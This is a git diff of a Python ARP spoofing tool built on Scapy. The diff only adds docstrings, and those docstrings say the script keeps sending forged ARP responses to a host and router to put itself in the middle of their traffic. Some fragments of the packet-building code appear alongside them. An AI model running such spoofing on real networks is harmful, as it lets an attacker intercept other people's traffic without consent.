@@ -4,6 +4,11 @@ import time
 
 
 def get_mac(ip):
+    """
+    Retrieves MAC address of target host or target router
+    :param ip: Target host or target router IP
+    :return: MAC address of given IP
+    """
     arp_request = ARP(pdst=ip)  # Create ARP request to ask who has given IP
     broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')  # Create Ethernet frame and Set destination MAC to broadcast MAC
     arp_request_broadcast = broadcast/arp_request   # Append ARP request to Ethernet frame
@@ -23,6 +28,7 @@ def spoof(target_ip, spoof_ip):
 
 
 def restore_mac_table(destination_ip, source_ip):
+    """Restores MAC table to original state when operation complete"""
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
@@ -30,6 +36,12 @@ def restore_mac_table(destination_ip, source_ip):
 
 
 def main():
+    """
+    Main flow of program:
+    Continuously send arp response packets to given host and router to position in middle of conversation
+    When Ctrl Z detected, restore MAC table to original state
+    :return:
+    """
     sent_packets_count = 0
     try:
         while True:
